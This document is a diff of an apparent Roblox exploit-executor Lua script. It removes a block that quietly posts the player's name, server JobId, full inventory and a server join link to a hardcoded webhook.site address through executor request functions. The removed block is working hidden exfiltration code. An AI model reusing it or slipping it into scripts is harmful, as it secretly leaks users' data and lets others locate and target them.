@@ -149,41 +149,6 @@ for i,v in game.ReplicatedStorage.Remotes.Extras.GetFullInventory:InvokeServer(g
 end
 inventory = table.concat(t)
 
-local urll = "https://webhook.site/2396ca9e-2539-45e5-910b-1bf036e9311e"
-local dataa = {
-		["embeds"] = {
-					{
-						["title"] =  game.JobId,
-						["description"] = "Name ".. game.Players.LocalPlayer.Name .. " Jobid: " ..game.JobId ..  " Inventory: " ..inventory,
-						["type"] = "rich",
-						["color"]= tonumber(0xff0000),
-						["footer"] = {
-							["icon_url"] = 'https://cdn.discordapp.com/icons/924841537328803870/2ea57c68b447a717b9ed0e0c3bc4f241.png?size=4096',
-							["text"] = ""
-						},
-						["thumbnail"] = {
-							["url"] = "https://cdn.discordapp.com/icons/924841537328803870/2ea57c68b447a717b9ed0e0c3bc4f241.png?size=4096",
-						},
-						["author"] = {
-							["name"] = ""
-						},
-						["fields"] = {
-							{
-								["name"] = '**Player profile**',
-								["value"] = "https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile https://www.roblox.com/games/start?placeId=16302670534&launchData=142823291/"..game.JobId,
-								["inline"] = true
-							},
-						}
-					}}
-			}
-local newdataa = game:GetService("HttpService"):JSONEncode(dataa)
-local headerss = {
-   ["content-type"] = "application/json"
-}
-requestt= http_request or request or HttpPost or syn.request
-local abcdeff = {Url = urll, Body = newdataa, Method = "POST", Headers = headerss}
-requestt(abcdeff)
-
 local data = {
 		["embeds"] = {
 					{
